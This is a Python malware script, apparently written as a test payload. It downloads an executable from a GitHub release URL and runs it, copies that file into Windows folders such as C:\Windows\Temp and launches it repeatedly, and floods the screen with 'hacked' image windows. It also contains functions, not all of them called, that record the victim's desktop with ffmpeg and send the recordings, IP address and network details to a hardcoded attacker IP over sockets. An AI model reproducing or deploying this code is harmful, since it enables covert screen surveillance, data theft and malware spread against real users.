import os
import shutil
import threading
import time
import sys
import subprocess
import tkinter as tk
import random
import socket
import classify
import requests

loop = False
print("Starting the payload...")
# Simulate some startup delay
def startup():
    # 1. create a hidden file called startup_log.txt in the same directory as the script
    with open('startup_log.txt', 'w') as f:
        f.write(f"Payload started at: {time.ctime()}\n") 
       

def main_payload():
    # begin screen recording using ffmpeg

    networkthings = classify.get_network_info()
    ip = classify.get_ip_info()
    #log the victim's IP address and timestamp to a local file then send the file to the attacker using sockets
    if os.path.exists('startup_log.txt'):
        with open('attack_log.txt', 'a') as log_file:
            log_file.write(f"Attacked: {ip} at {time.ctime()}. Gathered network info: {networkthings}\n")  
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(('96.224.75.16', 12345))  # Change to attacker's IP and port
            with open('attack_log.txt', 'rb') as f:
                s.sendall(f.read())



    # delete the recorded file after sending
    os.remove('screen_recording.mp4')
    os.remove('attack_log.txt')
    os.remove('startup_log.txt')
    time.sleep(300)  # wait for 5 minutes before the next recording
    # loop the screen recording and sending every 5 minutes
    loop = True



def background_task():
    def resource_path(relative_path):
        """ Get absolute path to resource, works for dev and for PyInstaller """
        try:
            # PyInstaller creates a temporary folder and stores path in _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")

        return os.path.join(base_path, relative_path)
    print("Resource path initialized...")
    

    # Example usage in your application:
    # Instead of: image_path = "logo.png"
    image_path = resource_path("hacked.png")

    # 1. Setup the main hidden controller
    root = tk.Tk()
    root.withdraw()

    # Load your image once
    image = tk.PhotoImage(file=f"{image_path}") 

    # 2. Create a function that handles the delay loop
    def spawn_window(g):
          # Random delay between 1 and 3 seconds
        if g > 0:
        # Create the pop-up
            window = tk.Toplevel(root)
            window.title("PAYLOAD_EXECUTED__" + str(g))
            
            print(f"Spawned window with g={g}")
        # Position it
            x_offset = 1 + ( random.randint(1, 1080))
            y_offset = 1 + ( random.randint(1, 720))
            window.geometry(f"1000x560+{x_offset}+{y_offset}")

        # Add image
            label = tk.Label(window, image=image)
            label.pack(pady=0)
            label.image = image 

        # 3. Instead of sleep, tell Tkinter to run this function again 
        # after 200 milliseconds (0.2 seconds) with the next 'g' value
            root.after(300, spawn_window, g - 1)

    starting_g = 100
    spawn_window(starting_g)
    # 5. Keep the program alive
    root.mainloop()


def background_task2():
    # Find any place to duplicate imgnocopy.exe and run it there.
    current_executable = "imgnocopy.exe"
    target_dirs = [
        "C:\\Users\\Public\\",
        "C:\\Windows\\Temp\\",
        "C:\\Program Files\\",
        os.path.join(os.getenv("APPDATA", "C:\\Users\\Public"), "Temp")
    ]

    while True:
        for target_dir in target_dirs:
            try:
                os.makedirs(target_dir, exist_ok=True)
                destination = os.path.join(target_dir, os.path.basename(current_executable))

                if os.path.abspath(destination).lower() == os.path.abspath(current_executable).lower():
                    continue

                shutil.copy2(current_executable, destination)
                print(f"Copied imgnocopy.exe to {destination}")
            except Exception as e:
                print(f"Error copying to {target_dir}: {e}")

        for target_dir in target_dirs:
            copied_executable = os.path.join(target_dir, os.path.basename(current_executable))
            if os.path.exists(copied_executable):
                if os.path.abspath(copied_executable).lower() == os.path.abspath(current_executable).lower():
                    continue
                try:
                    subprocess.Popen([copied_executable], shell=False)
                    print(f"Started imgnocopy.exe from {copied_executable}")
                except Exception as e:
                    print(f"Error running {copied_executable}: {e}")

        time.sleep(random.randint(1200, 3600))

def recordall():
    while True:
        recording_file = 'screen_recording.mp4'
        ffmpeg_cmd = (
            f'ffmpeg -y -f gdigrab -framerate 30 -i desktop -t 00:05:00 "{recording_file}"'
        )
        os.system(ffmpeg_cmd)

        if os.path.exists(recording_file):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.connect(('96.224.75.16', 12345))  # Change to attacker's IP and port
                    with open(recording_file, 'rb') as f:
                        s.sendall(f.read())
                print(f"Sent recording {recording_file}")
            except Exception as e:
                print(f"Error sending recording: {e}")
            try:
                os.remove(recording_file)
                print(f"Removed local recording {recording_file}")
            except Exception as e:
                print(f"Error removing recording: {e}")
        else:
            print(f"Recording failed, {recording_file} not found")

        time.sleep(1)

def installimgnocopy():
    # Install imgnocopy from github and run it
    try:
        url = "https://github.com/Pocat-12/testespayload/releases/download/1.0.2/imgnocopy.exe"
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open("imgnocopy.exe", "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print("imgnocopy.exe downloaded successfully")
            subprocess.Popen(["imgnocopy.exe"], shell=False)
            print("imgnocopy.exe started successfully")
        else:
            print(f"Failed to download imgnocopy.exe, status code: {response.status_code}")
    except Exception as e:
        print(f"Error downloading or starting imgnocopy.exe: {e}")






thread4 = threading.Thread(target=installimgnocopy)
thread4.start()
thread3 = threading.Thread(target=background_task2)
thread3.start()
thread1 = threading.Thread(target=background_task)
time.sleep(random.randint(15, 300))
thread1.start()
 # Wait for the background task to initialize
thread2 = threading.Thread(target=background_task)
thread2.start()
time.sleep(1) 
